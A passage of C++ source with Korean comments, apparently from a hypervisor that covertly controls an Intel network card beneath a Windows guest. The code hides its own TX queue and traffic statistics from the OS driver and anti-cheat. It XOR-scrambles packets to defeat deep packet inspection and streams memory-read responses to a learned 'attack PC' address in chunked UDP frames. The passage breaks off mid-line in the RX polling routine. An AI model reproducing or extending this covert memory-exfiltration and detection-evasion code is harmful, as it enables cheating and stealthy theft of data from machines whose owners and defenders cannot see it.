// TDBAL 안 건드림 → OS igc driver와 충돌 없음 (v4 검증)
// TDBAL=0 복구? → setup_igc_hv_tx_queue 재호출로 처리 (OPEN 시)
// ============================================================================
void nic::reset_tx_ring(const void* slat_cr3_ptr)
{
    if (!igc_hv_tx.initialized) return;

    // 1. TX queue 비활성화
    write_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL, 0);
    for (int i = 0; i < 1000; i++) {
        if (!(read_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL) & IGC_TXDCTL_ENABLE)) break;
        _mm_pause();
    }

    // 2. Descriptor ring 재초기화 (batch TX: 각 slot 고유 buffer)
    auto* ring = static_cast<igc_tx_desc_t*>(igc_hv_tx.desc_ring_va);
    for (std::uint32_t i = 0; i < igc_hv_tx.desc_count; i++)
    {
        ring[i].buffer_addr = igc_hv_tx.buf_gpa[i];
        ring[i].cmd_type_len = 0;
        ring[i].olinfo_status = IGC_TXD_STAT_DD;
    }

    // 3. Cache flush
    for (std::uint32_t cl = 0; cl < igc_hv_tx.desc_count * 16; cl += 64)
        _mm_clflush(reinterpret_cast<std::uint8_t*>(ring) + cl);
    _mm_sfence();

    // 4. SW pointers 리셋
    igc_hv_tx.sw_tail = 0;
    igc_hv_tx.sw_head = 0;
    igc_hv_tx.nb_tx_free = igc_hv_tx.desc_count - 1;

    // 5. TDT = 0 + TX queue 재활성화
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDT, 0);
    constexpr std::uint32_t TXDCTL_VAL = IGC_TXDCTL_ENABLE | (1u << 16);
    write_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL, TXDCTL_VAL);
    for (int i = 0; i < 1000; i++) {
        if (read_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL) & IGC_TXDCTL_ENABLE) break;
        _mm_pause();
    }
}

// ============================================================================
// [Fallback] TX Frame Injection - IGC Q0 (Q1 미초기화시 사용)
// ============================================================================
// TX Q1 초기화 실패시 old 방식: OS Q0 descriptor/buffer 빌려서 전송
// ⚠️ OS ring 오염 위험 있음 → Q1 성공하면 이 경로 안 탐
// ============================================================================

static std::uint8_t inject_tx_frame_intel_igc_q0_fallback(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{
    const cr3 slat = cached_slat_cr3;
    const std::uint32_t tx_count = nic::state.tx_count;
    if (tx_count == 0) return 0;

    const std::uint32_t tdt = nic::read_reg(&slat, nic::reg_tdt(nic::state));
    std::uint32_t tdh = nic::read_reg(&slat, nic::reg_tdh(nic::state));
    const std::uint32_t next_tdt = (tdt + 1) % tx_count;

    if (next_tdt == tdh) {
        constexpr std::uint32_t MAX_DRAIN_POLLS = 1000;
        for (std::uint32_t spin = 0; spin < MAX_DRAIN_POLLS; spin++) {
            tdh = nic::read_reg(&slat, nic::reg_tdh(nic::state));
            if (next_tdt != tdh) break;
        }
        if (next_tdt == tdh) {
            network::packets_dropped++;
            return 0;
        }
    }

    const std::uint64_t desc_gpa = nic::state.tx_ring_gpa + tdt * sizeof(nic::igc_tx_desc_t);
    auto* desc = static_cast<nic::igc_tx_desc_t*>(
        memory_manager::map_guest_physical(slat, desc_gpa));
    if (!desc) return 0;

    if (desc->buffer_addr == 0) { network::packets_dropped++; return 0; }
    if (!(desc->olinfo_status & nic::IGC_TXD_STAT_DD) && desc->cmd_type_len != 0) {
        network::packets_dropped++; return 0;
    }

    auto* buf = static_cast<std::uint8_t*>(
        memory_manager::map_guest_physical(slat, desc->buffer_addr));
    if (!buf) return 0;

    crt::copy_memory(buf, raw_frame, frame_len);

    desc->cmd_type_len = nic::IGC_TXD_DTYP_DATA
        | nic::IGC_TXD_CMD_DEXT
        | nic::IGC_TXD_CMD_EOP
        | nic::IGC_TXD_CMD_IFCS
        | nic::IGC_TXD_CMD_RS
        | (frame_len & 0xFFFF);
    desc->olinfo_status = static_cast<std::uint32_t>(frame_len) << nic::IGC_TXD_PAYLEN_SHIFT;

    _mm_sfence();
    nic::write_reg(&slat, nic::reg_tdt(nic::state), next_tdt);

    constexpr std::uint32_t MAX_TX_WAIT = 10000;
    for (std::uint32_t i = 0; i < MAX_TX_WAIT; i++) {
        if (desc->olinfo_status & nic::IGC_TXD_STAT_DD) break;
    }

    return 1;
}

// ============================================================================
// [핵심] TX Frame Injection - IGC TX Queue 1 (OS Q0 완전 격리!)
// ============================================================================
// OS TX Q0: 0xE000 (드라이버 전용 - 절대 안 건드림)
// HV TX Q1: 0xE040 (우리 전용 hidden page 기반)
//
// 감지 벡터 분석:
//   ✅ OS TDT(0xE018) 변경: 0 → Q1 TDT(0xE058)만 사용
//   ✅ OS 버퍼 덮어쓰기: 0 → 전용 hidden page
//   ✅ OS ring 오염: 0 → 별도 descriptor ring
//   ⚠️ NIC Q1 TDT write: 불가피 (패킷 전송 트리거)
//   ⚠️ 물리 와이어에 패킷 나감: 불가피 (네트워크 통신 본질)
// ============================================================================

// ============================================================================
// [DPDK-style] Batch TX — 3단계: cleanup → enqueue → commit
// ============================================================================
// 기존: inject_tx_frame() 1개씩 + DD wait = 90 × 9μs = 810μs
// 변경: enqueue N개 → commit 1번 = memcpy N회 + MMIO 1회 ≈ 10μs
//
// tx_cleanup(): DD 완료된 descriptor slot 회수 → nb_tx_free 증가
// tx_enqueue(): frame을 ring slot에 복사, descriptor 설정 (TDT 안 건드림)
// tx_commit():  TDT MMIO write 1번 → NIC에 batch 전달
// ============================================================================

// ----------------------------------------------------------------------------
// tx_cleanup: 완료된 descriptor 회수
// ----------------------------------------------------------------------------
// sw_head부터 순회하며 DD=1인 descriptor의 slot을 free로 되돌림
// RS bit이 매 desc에 설정되므로 개별 DD 확인 가능
// ----------------------------------------------------------------------------
static std::uint32_t tx_cleanup()
{
    auto* ring = static_cast<nic::igc_tx_desc_t*>(nic::igc_hv_tx.desc_ring_va);
    const std::uint32_t count = nic::igc_hv_tx.desc_count;
    std::uint32_t head = nic::igc_hv_tx.sw_head;
    std::uint32_t tail = nic::igc_hv_tx.sw_tail;
    std::uint32_t reclaimed = 0;

    // head == tail → ring 비어있음 (회수할 것 없음)
    while (head != tail)
    {
        volatile std::uint32_t* status_ptr =
            reinterpret_cast<volatile std::uint32_t*>(&ring[head].olinfo_status);
        if (!(*status_ptr & nic::IGC_TXD_STAT_DD))
            break;  // 아직 NIC 미완료 → 여기서 멈춤

        reclaimed++;
        head = (head + 1) % count;
    }

    if (reclaimed > 0)
    {
        nic::igc_hv_tx.sw_head = head;
        nic::igc_hv_tx.nb_tx_free += reclaimed;
    }
    return reclaimed;
}

// ----------------------------------------------------------------------------
// tx_enqueue: frame 1개를 ring slot에 적재 (TDT 변경 없음!)
// ----------------------------------------------------------------------------
// 리턴: 1=성공, 0=ring full
// NIC는 아직 이 frame을 모름 (TDT 안 움직임)
// ----------------------------------------------------------------------------
static std::uint8_t tx_enqueue(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{
    if (nic::igc_hv_tx.nb_tx_free == 0) {
        // ring full → cleanup 시도
        tx_cleanup();
        if (nic::igc_hv_tx.nb_tx_free == 0) {
            return 0;  // 진짜 full
        }
    }

    const std::uint32_t slot = nic::igc_hv_tx.sw_tail;
    const std::uint32_t count = nic::igc_hv_tx.desc_count;

    // Frame → slot buffer 복사
    auto* buf = static_cast<std::uint8_t*>(nic::igc_hv_tx.buf_va[slot]);
    crt::copy_memory(buf, raw_frame, frame_len);

    // Cache flush: buffer data
    for (std::uint32_t cl = 0; cl < frame_len; cl += 64)
        _mm_clflush(buf + cl);

    // Descriptor 설정
    auto* ring = static_cast<nic::igc_tx_desc_t*>(nic::igc_hv_tx.desc_ring_va);
    auto& desc = ring[slot];
    desc.buffer_addr = nic::igc_hv_tx.buf_gpa[slot];
    desc.olinfo_status = static_cast<std::uint32_t>(frame_len) << nic::IGC_TXD_PAYLEN_SHIFT;
    desc.cmd_type_len = nic::IGC_TXD_DTYP_DATA
        | nic::IGC_TXD_CMD_DEXT
        | nic::IGC_TXD_CMD_EOP
        | nic::IGC_TXD_CMD_IFCS
        | nic::IGC_TXD_CMD_RS       // 매 desc RS → 개별 DD writeback
        | (frame_len & 0xFFFF);

    // Cache flush: descriptor
    _mm_clflush(&desc);

    // SW tail 전진
    nic::igc_hv_tx.sw_tail = (slot + 1) % count;
    nic::igc_hv_tx.nb_tx_free--;

    // Stats shadow: track Q1 TX for NIC stats page hiding
    network::hv_tx_interval_packets++;
    network::hv_tx_interval_bytes += frame_len;

    return 1;
}

// ----------------------------------------------------------------------------
// tx_commit: TDT MMIO write → NIC에 batch 전달
// ----------------------------------------------------------------------------
// enqueue한 모든 frame을 한 번에 NIC에 알림
// 이 함수가 호출되기 전까지 NIC는 새 frame을 모름
// ----------------------------------------------------------------------------
static void tx_commit()
{
    _mm_sfence();  // 모든 store 완료 보장
    const cr3 slat = cached_slat_cr3;
    nic::write_reg(&slat, nic::IGC_TXQ1_TDT, nic::igc_hv_tx.sw_tail);
}

// ============================================================================
// [호환성] inject_tx_frame_intel_igc — batch TX wrapper
// ============================================================================
// 기존 코드 호환: 단일 frame inject → enqueue + commit
// flush_deferred_tx에서는 직접 enqueue/commit 사용
// ============================================================================
static std::uint8_t inject_tx_frame_intel_igc(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{

    if (!nic::igc_hv_tx.initialized) {
        return inject_tx_frame_intel_igc_q0_fallback(raw_frame, frame_len);
    }

    if (!tx_enqueue(raw_frame, frame_len)) {
        network::packets_dropped++;
        nic::igc_hv_tx.consecutive_fail++;

        if (nic::igc_hv_tx.consecutive_fail >= 3) {
            const cr3 slat = cached_slat_cr3;

            // [INSTANT RECOVERY] Check if NIC was globally reset
            // TDBAL=0 means all queue regs were wiped (CTRL.RST, D3->D0, etc)
            // Simple TXDCTL toggle won't help - need full Q1 re-init.
            // Host PA bypass: invisible to OS/AC.
            const std::uint32_t tdbal = nic::read_reg(&slat, nic::IGC_TXQ1_TDBAL);
            const std::uint32_t txdctl = nic::read_reg(&slat, nic::IGC_TXQ1_TXDCTL);


            if (tdbal == 0 || !(txdctl & nic::IGC_TXDCTL_ENABLE)) {
                // NIC was reset - full Q1 reprogram
                std::uint32_t reason = 0;
                if (!(txdctl & nic::IGC_TXDCTL_ENABLE)) reason |= 1;
                if (tdbal == 0) reason |= 2;

                nic::setup_igc_hv_tx_queue(&slat);

                // [RX RE-SYNC] TDBAL=0 = full NIC reset -> RX rings also stale.
                // Re-read all RX queue config to fix ring_gpa, our_index, buf_cache.
                if (tdbal == 0) {
                    nic::read_igc_multi_queue_config(&slat);
                }

                // [DESYNC FIX] Kill active deferred_tx.
                // In-flight chunks were lost in ring reset.
                // Client gets clean timeout -> retries from scratch.
                // Without this: partial response -> count mismatch -> cascade.
                if (deferred_tx.active) {
                    deferred_tx.active = 0;
                }
            }
            else {
                // Q1 regs intact but ring stuck - simple toggle
                nic::reset_tx_ring(&slat);

                // Also abort deferred_tx: ring reset loses in-flight descs
                if (deferred_tx.active) {
                    deferred_tx.active = 0;
                }
            }
            nic::igc_hv_tx.consecutive_fail = 0;
        }
        return 0;
    }

    tx_commit();
    nic::igc_hv_tx.consecutive_fail = 0;
    return 1;
}

// ============================================================================
// TX Frame Injection - Dispatcher
// ============================================================================

static std::uint8_t inject_tx_frame(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{
    if (nic::state.nic_type == nic::nic_type_t::INTEL)
    {
        // [핵심] igc(I225/I226): 전용 TX Queue 1 사용 (OS Q0 격리!)
        if (nic::state.intel_gen == nic::intel_gen_t::IGC)
            return inject_tx_frame_intel_igc(raw_frame, frame_len);
        else
            return inject_tx_frame_intel_legacy(raw_frame, frame_len);
    }
    return 0;
}

// ============================================================================
// [DPDK-style] Deferred TX Flush — batch enqueue + single commit
// ============================================================================
// 기존: chunk마다 inject_tx_frame() → 90 DD waits + 90 MMIO = ~810μs
// 변경: chunk마다 tx_enqueue() → 1 tx_commit() = memcpy 90회 + MMIO 1회
//
// Ring full 대응:
//   127 slots (ring-1) < 필요 chunks → 중간에 commit+cleanup 반복
//   일반 ReadScatter(4KB) = ~3 chunks → 여유
//   대량 읽기(128KB) = ~90 chunks → ring 127로 1회 커버
// ============================================================================
static std::uint32_t flush_deferred_tx()
{
    if (!deferred_tx.active) return 0;

    // [핵심] stale timeout: 클라이언트 사망 대비
    const std::uint64_t elapsed = read_tsc() - deferred_tx.start_tsc;
    if (elapsed > DEFERRED_TX_TIMEOUT_TSC) {
        deferred_tx.active = 0;
        return 0;
    }

    constexpr std::uint32_t CHUNK_HDR_SIZE = 12;
    constexpr std::uint32_t CHUNK_DATA_MAX = 1460;
    constexpr std::uint32_t ETH_HDR_SIZE = 14;
    constexpr std::uint32_t IP_HDR_SIZE = 20;

    const std::uint8_t* payload = response_buffer;
    const std::uint32_t payload_size = deferred_tx.payload_size;
    const std::uint32_t total_chunks = deferred_tx.total_chunks;
    const std::uint32_t cur_seq = deferred_tx.response_seq;

    std::uint32_t chunks_this_exit = 0;
    std::uint32_t ci = deferred_tx.next_chunk;
    std::uint32_t enqueued_since_commit = 0;

    // [batch TX] 진입 시 cleanup: 이전 batch에서 완료된 slot 회수
    if (nic::igc_hv_tx.initialized) {
        tx_cleanup();
    }

    while (ci < total_chunks && chunks_this_exit < MAX_CHUNKS_PER_EXIT)
    {
        // [batch TX] ring full → 중간 commit + cleanup
        if (nic::igc_hv_tx.initialized && nic::igc_hv_tx.nb_tx_free == 0) {
            if (enqueued_since_commit > 0) {
                tx_commit();
                enqueued_since_commit = 0;
            }
            // DD 완료 대기: 최대 25000 pause (~500μs)
            for (std::uint32_t w = 0; w < 25000; w++) {
                tx_cleanup();
                if (nic::igc_hv_tx.nb_tx_free > 0) break;
                _mm_pause();
            }
            if (nic::igc_hv_tx.nb_tx_free == 0) {
                // Ring stuck after 500us wait -> check Q1 health
                nic::igc_hv_tx.consecutive_fail++;
                if (nic::igc_hv_tx.consecutive_fail >= 3) {
                    const cr3 slat = cached_slat_cr3;
                    const std::uint32_t tdbal = nic::read_reg(&slat, nic::IGC_TXQ1_TDBAL);
                    const std::uint32_t txdctl = nic::read_reg(&slat, nic::IGC_TXQ1_TXDCTL);

                    if (tdbal == 0 || !(txdctl & nic::IGC_TXDCTL_ENABLE)) {
                        std::uint32_t reason = 0;
                        if (!(txdctl & nic::IGC_TXDCTL_ENABLE)) reason |= 1;
                        if (tdbal == 0) reason |= 2;
                        nic::setup_igc_hv_tx_queue(&slat);
                    }
                    else {
                        nic::reset_tx_ring(&slat);
                    }
                    nic::igc_hv_tx.consecutive_fail = 0;

                    // [DESYNC FIX] Abort this deferred_tx entirely.
                    // Ring reset killed in-flight chunks -> partial response.
                    // Client gets clean timeout -> retries whole request.
                    deferred_tx.active = 0;
                    return 0;
                }
                break;  // abort this exit
            }
        }

        // 이 chunk의 데이터 오프셋/크기
        std::uint32_t data_offset = ci * CHUNK_DATA_MAX;
        std::uint32_t remaining = (data_offset < payload_size) ? (payload_size - data_offset) : 0;
        std::uint32_t chunk_data = (remaining > CHUNK_DATA_MAX) ? CHUNK_DATA_MAX : remaining;
        std::uint32_t udp_payload_size = CHUNK_HDR_SIZE + chunk_data;

        // 프레임 구성: ETH(14) + IP(20) + UDP(8) + chunk_hdr(12) + data
        auto* eth = reinterpret_cast<packet::eth_hdr_t*>(tx_frame_buffer);
        auto* ip = reinterpret_cast<packet::ip_hdr_t*>(tx_frame_buffer + ETH_HDR_SIZE);
        auto* udp = reinterpret_cast<packet::udp_hdr_t*>(tx_frame_buffer + ETH_HDR_SIZE + IP_HDR_SIZE);

        // chunk header
        auto* chdr16 = reinterpret_cast<std::uint16_t*>(
            tx_frame_buffer + ETH_HDR_SIZE + IP_HDR_SIZE + 8);
        chdr16[0] = static_cast<std::uint16_t>(ci);
        chdr16[1] = static_cast<std::uint16_t>(total_chunks);
        auto* chdr32 = reinterpret_cast<std::uint32_t*>(chdr16 + 2);
        chdr32[0] = payload_size;
        chdr32[1] = cur_seq;

        if (chunk_data > 0) {
            crt::copy_memory(
                tx_frame_buffer + ETH_HDR_SIZE + IP_HDR_SIZE + 8 + CHUNK_HDR_SIZE,
                payload + data_offset, chunk_data);
        }

        // ETH header
        for (int i = 0; i < 6; i++) {
            eth->dst_mac[i] = nic::state.attack_mac[i];
            eth->src_mac[i] = nic::state.mac[i];
        }
        eth->ethertype = packet::ETHERTYPE_IPV4;

        // IP header
        ip->ver_ihl = 0x45;
        ip->tos = 0;
        ip->total_length = packet::htons(
            static_cast<std::uint16_t>(IP_HDR_SIZE + 8 + udp_payload_size));
        ip->identification = packet::htons(ip_frag::next_ip_id());
        ip->flags_frag = packet::htons(ip_frag::IP_FLAG_DF);
        ip->ttl = 128;
        ip->protocol = packet::IP_PROTO_UDP;
        ip->checksum = 0;
        ip->src_ip = our_ip;
        ip->dst_ip = nic::state.attack_ip;
        ip->checksum = packet::ip_checksum(ip, IP_HDR_SIZE);

        // UDP header
        udp->src_port = our_src_port;
        udp->dst_port = attack_src_port;
        udp->length = packet::htons(static_cast<std::uint16_t>(8 + udp_payload_size));
        udp->checksum = 0;

        std::uint32_t frame_size = ETH_HDR_SIZE + IP_HDR_SIZE + 8 + udp_payload_size;

        // Wire obfuscation: XOR-encrypt UDP payload before TX
        // Scrambles chunk_hdr + DMA response data so NDIS filter sees random bytes
        dma::wire_xor(
            tx_frame_buffer + ETH_HDR_SIZE + IP_HDR_SIZE + 8,
            udp_payload_size);

        // [DPDK-style] enqueue only, single commit at loop end.
        // MAX_CHUNKS_PER_EXIT=45 limits burst size. No mid-commit needed.
        if (nic::igc_hv_tx.initialized) {
            std::uint8_t ok = tx_enqueue(
                tx_frame_buffer, frame_size);
            if (ok) {
                deferred_tx.chunks_sent_ok++;
                enqueued_since_commit++;
            }
        }
        else {
            // fallback: legacy inject (Q0)
            std::uint8_t ok = inject_tx_frame(tx_frame_buffer, frame_size);
            if (ok) deferred_tx.chunks_sent_ok++;
        }

        ci++;
        chunks_this_exit++;
    }

    // [DPDK-style] 루프 완료 후 단 1번 commit → NIC에 batch 전달
    if (enqueued_since_commit > 0) {
        tx_commit();
        nic::igc_hv_tx.consecutive_fail = 0;
    }

    deferred_tx.next_chunk = ci;

    // 전송 완료?
    if (ci >= total_chunks) {
        deferred_tx.active = 0;
    }

    return chunks_this_exit;
}

// ============================================================================
// Send Response - Deferred TX 시작 (즉시 전송 아님!)
// ============================================================================
// [핵심] 이전: chunked_udp_send()로 722 chunks 한번에 전송 → HV 사망
// 변경: deferred_tx state 설정만 하고 return → process_pending()에서 분할 전송
// ============================================================================

std::uint8_t network::send_response(
    const std::uint8_t* dma_response,
    const std::uint32_t size)
{

    std::uint32_t fail_bits = 0;
    if (!is_initialized) fail_bits |= 1;
    if (!nic::state.attack_mac_learned) fail_bits |= 2;
    if (!tx_frame_buffer) fail_bits |= 4;

    if (fail_bits) {
        return 0;
    }

    while (deferred_tx.active) {
        flush_deferred_tx();
    }

    constexpr std::uint32_t CHUNK_DATA_MAX = 1460;
    std::uint32_t chunk_total = (size + CHUNK_DATA_MAX - 1) / CHUNK_DATA_MAX;
    if (chunk_total == 0) chunk_total = 1;

    deferred_tx.payload_size = size;
    deferred_tx.total_chunks = chunk_total;
    deferred_tx.next_chunk = 0;
    deferred_tx.response_seq = deferred_tx_seq_counter++;
    deferred_tx.chunks_sent_ok = 0;
    deferred_tx.start_tsc = read_tsc();
    deferred_tx.active = 1;

    flush_deferred_tx();

    packets_sent++;
    return 1;
}

std::uint8_t network::send_packet(const std::uint8_t* data, const std::uint32_t size)
{
    return send_response(data, size);
}

// ============================================================================
// Learn Attack PC Address
// ============================================================================

static void learn_attack_address(const std::uint8_t* pkt_data)
{
    const auto* eth = reinterpret_cast<const packet::eth_hdr_t*>(pkt_data);
    const auto* ip = reinterpret_cast<const packet::ip_hdr_t*>(pkt_data + 14);
    const auto* udp = reinterpret_cast<const packet::udp_hdr_t*>(pkt_data + 34);

    for (int i = 0; i < 6; i++)
        nic::state.attack_mac[i] = eth->src_mac[i];

    nic::state.attack_ip = ip->src_ip;
    our_ip = ip->dst_ip;
    our_src_port = udp->dst_port;           // HV측 포트 (28473, network order)
    attack_src_port = udp->src_port;        // [핵심] 공격 PC의 ephemeral port (network order)
    nic::state.attack_mac_learned = 1;
}

// ============================================================================
// DMA Payload Processing
// ============================================================================

static void process_complete_dma_payload(
    const std::uint8_t* dma_payload,
    std::uint32_t dma_size)
{
    if (dma_size < 16) return;

    const auto magic = *reinterpret_cast<const std::uint32_t*>(dma_payload);
    if (magic != 0x48564430) return;

    const auto* hdr = reinterpret_cast<const dma::msg_hdr_t*>(dma_payload);

    if (hdr->type == dma::msg_type_t::open_req) {
        deferred_tx.active = 0;
    }

    if (hdr->version != 0x0001) { return; }
    else if (hdr->cb_msg > dma_size) { return; }

    const std::uint32_t rsp_size = dma::process(
        dma_payload, dma_size,
        response_buffer, response_buffer_size);

    if (rsp_size > 0) {
        network::send_response(response_buffer, rsp_size);
    }
    network::packets_received++;
}

// ============================================================================
// RX Packet Processing
// ============================================================================

static std::uint8_t process_rx_packet(
    const std::uint8_t* pkt_data,
    const std::uint32_t pkt_len)
{
    if (pkt_len < 34 || pkt_len > 1514) return 0;

    const auto* eth = reinterpret_cast<const packet::eth_hdr_t*>(pkt_data);
    if (eth->ethertype != packet::ETHERTYPE_IPV4) return 0;

    const std::uint8_t* ip_packet = pkt_data + 14;
    const std::uint32_t ip_len = pkt_len - 14;
    const auto* ip_hdr = reinterpret_cast<const packet::ip_hdr_t*>(ip_packet);

    if (ip_hdr->protocol != packet::IP_PROTO_UDP) return 0;

    const std::uint8_t* udp_payload = nullptr;
    std::uint32_t udp_payload_size = 0;

    const std::uint8_t result = ip_frag::process_ip_packet(
        ip_packet, ip_len,
        &udp_payload, &udp_payload_size);

    if (result == 2)
    {

        // [버그수정 0xFB] learn을 여기서 제거 → DMA 포트 체크 안으로 이동
        // 이전: 첫 UDP(NetBIOS 137 등)에서 learn → our_src_port 오염

        const auto* udp_hdr = reinterpret_cast<const packet::udp_hdr_t*>(
            ip_packet + (ip_hdr->ver_ihl & 0x0F) * 4);


        // DMA packet identification: XOR-decrypt UDP payload then validate magic
        // Wire obfuscation: magic never appears in cleartext on wire (defeats NDIS DPI)
        if (udp_payload_size >= 16)
        {
            // XOR-decrypt UDP payload in-place (pkt_data is rx_local_buf, mutable)
            dma::wire_xor(const_cast<std::uint8_t*>(udp_payload), udp_payload_size);

            const auto magic = *reinterpret_cast<const std::uint32_t*>(udp_payload);
            if (magic == 0x48564430)
            {

                // Learn attack PC address from first valid DMA packet
                if (!nic::state.attack_mac_learned)
                    learn_attack_address(pkt_data);

                // Update ports every DMA packet (ephemeral port may change on reconnect)
                attack_src_port = udp_hdr->src_port;
                our_src_port = udp_hdr->dst_port;

                const std::uint32_t ihl_val = (pkt_data[14] & 0x0F) * 4;
                const std::uint8_t* udp_hdr_ptr = pkt_data + 14 + ihl_val;

                process_complete_dma_payload(udp_payload, udp_payload_size);

                // RX stats shadow: track DMA packets consumed from Q0
                // Subtracted from GPRC/GORCL in stats page shadow
                network::hv_rx_interval_packets++;
                network::hv_rx_interval_bytes += pkt_len;

                return 1;
            }
        }
    }
    else if (result == 1)
    {
        // Reassembled IP fragment — XOR-decrypt then process
        // Client XOR'd the full UDP payload before send. IP stack fragmented it.
        // After reassembly we have the original XOR'd payload — must decrypt.
        dma::wire_xor(const_cast<std::uint8_t*>(udp_payload), udp_payload_size);

        process_complete_dma_payload(udp_payload, udp_payload_size);

        // RX stats shadow: reassembled DMA packet
        network::hv_rx_interval_packets++;
        network::hv_rx_interval_bytes += (42 + udp_payload_size);

        return 1;
    }

    return 0;
}

// ============================================================================
// RX Ring Polling - Intel e1000e (Legacy Descriptor)
// ============================================================================

static std::uint8_t poll_rx_ring_intel_legacy()
{
    const cr3 slat = cached_slat_cr3;
    std::uint8_t processed = 0;

    // [핵심] TX stats 클리어 제거 - 레지스터 변조 감지 벡터 제거

    // [핵심] 올바른 RDH 오프셋 사용
    const std::uint32_t rx_head = nic::read_reg(&slat, nic::reg_rdh(nic::state));
    const std::uint32_t rx_count = nic::state.rx_count;
    if (rx_count == 0) return 0;

    std::uint32_t idx = nic::state.our_rx_index;
    std::uint32_t checked = 0;
    constexpr std::uint32_t MAX_PACKETS_PER_POLL = 32;

    while (idx != rx_head && checked < MAX_PACKETS_PER_POLL)
    {
        const std::uint64_t desc_gpa = nic::state.rx_ring_gpa + idx * sizeof(nic::intel_rx_desc_t);
        const auto* desc = static_cast<const nic::intel_rx_desc_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!desc) break;

        if (!(desc->status & nic::INTEL_RX_STATUS_DD)) break;

        if (desc->status & nic::INTEL_RX_STATUS_EOP)
        {
            const auto* pkt_data = static_cast<const std::uint8_t*>(
                memory_manager::map_guest_physical(slat, desc->buffer_addr));

            if (pkt_data)
            {
                // [핵심] Guest 메모리 로컬 복사 (race condition 방지)
                static std::uint8_t rx_local_buf_leg[1514];
                const std::uint16_t len = desc->length;
                if (len > 0 && len <= 1514) {
                    crt::copy_memory(rx_local_buf_leg, pkt_data, len);
                    processed |= process_rx_packet(rx_local_buf_leg, len);
                }
            }
        }

        idx = (idx + 1) % rx_count;
        checked++;
    }

    nic::state.our_rx_index = idx;
    ip_frag::reasm_tick();
    return processed;
}

// ============================================================================
// [핵심] RX Ring Polling - Intel igc 멀티큐 (Advanced Descriptor)
// ============================================================================
// I225-V RSS가 4개 큐에 패킷 분배 → 전부 폴링해야 누락 없음
// MRQC/RETA 수정 없이 순수 읽기 전용!
//
// 큐별 advanced write-back format:
//   staterr[0] = DD, staterr[1] = EOP
//   length = packet length (separate field)
//   buffer_addr → RSS hash (원본 주소 사라짐, 큐별 캐시에서 읽어야 함)
// ============================================================================

static std::uint8_t poll_rx_ring_intel_igc()
{
    const cr3 slat = cached_slat_cr3;
    std::uint8_t processed = 0;

    // [핵심] 모든 활성 큐 순회 - NIC 레지스터 쓰기 0!
    for (std::uint32_t q = 0; q < nic::IGC_MAX_RX_QUEUES; q++)
    {
        auto& rxq = nic::igc_rxq[q];
        if (!rxq.active || rxq.count == 0) continue;

        // ================================================================
        // [핵심 0xFB] ROTATING RING SCANNER - 전체 ring 순회하여 DD=0 캐싱
        // ================================================================
        // 문제: our_index 앞 64개만 스캔하면 DD=1 영역만 보임
        // 해결: scan_cursor가 매 VMEXIT마다 32개씩 전진, ~32회면 1024 전체 완료
        //
        // Ring layout:
        //   [our_index] ──DD=1──> [RDH] ──DD=0──> [RDT] ──DD=1──> [our_index]
        //                                    ↑ DD=0 = READ format = pkt_addr 유효!
        //
        // DD=0 descriptor의 pkt_addr → 캐시에 저장
        // DD=1이 되면(NIC 처리 후) pkt_addr는 rss_hash로 덮어씌워지지만
        // 캐시에 이미 올바른 주소가 있으므로 정확한 버퍼 접근 가능
        // ================================================================
        if (rxq.buf_cache_valid)
        {
            constexpr std::uint32_t SCAN_PER_VMEXIT = 32;
            std::uint32_t scan_idx = rxq.scan_cursor;

            for (std::uint32_t s = 0; s < SCAN_PER_VMEXIT; s++)
            {
                if (scan_idx >= rxq.count) scan_idx = 0;


                if (scan_idx < nic::MAX_RXQ_BUF_CACHE)
                {
                    const std::uint64_t desc_gpa = rxq.ring_gpa + scan_idx * 16;

                    // [핵심] 16바이트 전체를 하나의 READ format으로 해석
                    // READ format: [0:7]=pkt_addr, [8:15]=hdr_addr
                    // WB format:   [0:3]=rss, [4:7]=info, [8:11]=staterr(DD@bit0), [12:15]=len+vlan
                    // DD 판별: offset[8:11] bit 0 → WB에서는 DD, READ에서는 hdr_addr LSB
                    // igc driver는 hdr_addr=0으로 설정 → bit 0 = 0 → DD=0 정확
                    const auto* raw = static_cast<const volatile std::uint8_t*>(
                        memory_manager::map_guest_physical(slat, desc_gpa));

                    if (raw)
                    {
                        // staterr는 offset [8:11], DD = bit 0
                        const std::uint32_t staterr = *reinterpret_cast<const volatile std::uint32_t*>(raw + 8);

                        if (!(staterr & nic::IGC_RXD_STAT_DD))
                        {
                            // DD=0 → READ format → pkt_addr at [0:7]

                            const std::uint64_t addr = *reinterpret_cast<const volatile std::uint64_t*>(raw);
                            const std::uint64_t hdr = *reinterpret_cast<const volatile std::uint64_t*>(raw + 8);

                            if (addr != 0 && addr < 0x0000FFFFFFFFFFFF)
                            {
                                nic::igc_rxq_buf_cache[q][scan_idx] = addr;
                            }
                            else
                            {
                            }
                        }
                        else
                        {
                        }
                    }
                }

                scan_idx = (scan_idx + 1) % rxq.count;
            }

            rxq.scan_cursor = scan_idx;
        }

        // ================================================================
        // [핵심] 큐별 RDH 읽기 (읽기 전용!)
        // ================================================================
        const std::uint32_t rx_head = nic::read_reg(&slat, nic::igc_rxq_rdh(q));
        std::uint32_t idx = rxq.our_index;
        std::uint32_t checked = 0;
        constexpr std::uint32_t MAX_PER_QUEUE = 16; // 큐당 최대 처리량

        while (idx != rx_head && checked < MAX_PER_QUEUE)
        {
            const std::uint64_t desc_gpa = rxq.ring_gpa + idx * 16;
            const auto* wb = static_cast<const nic::igc_rx_desc_wb_t*>(
                memory_manager::map_guest_physical(slat, desc_gpa));
            if (!wb) break;

            if (!(wb->staterr & nic::IGC_RXD_STAT_DD)) break;


            if (wb->staterr & nic::IGC_RXD_STAT_EOP)
            {
                const std::uint16_t pkt_len = wb->length;

                // [핵심] buffer address는 큐별 캐시에서 가져옴
                std::uint64_t buf_addr = 0;
                if (rxq.buf_cache_valid && idx < nic::MAX_RXQ_BUF_CACHE)
                    buf_addr = nic::igc_rxq_buf_cache[q][idx];

                if (buf_addr != 0 && pkt_len > 0 && pkt_len <= 1514)
                {
                    const auto* pkt_data = static_cast<const std::uint8_t*>(
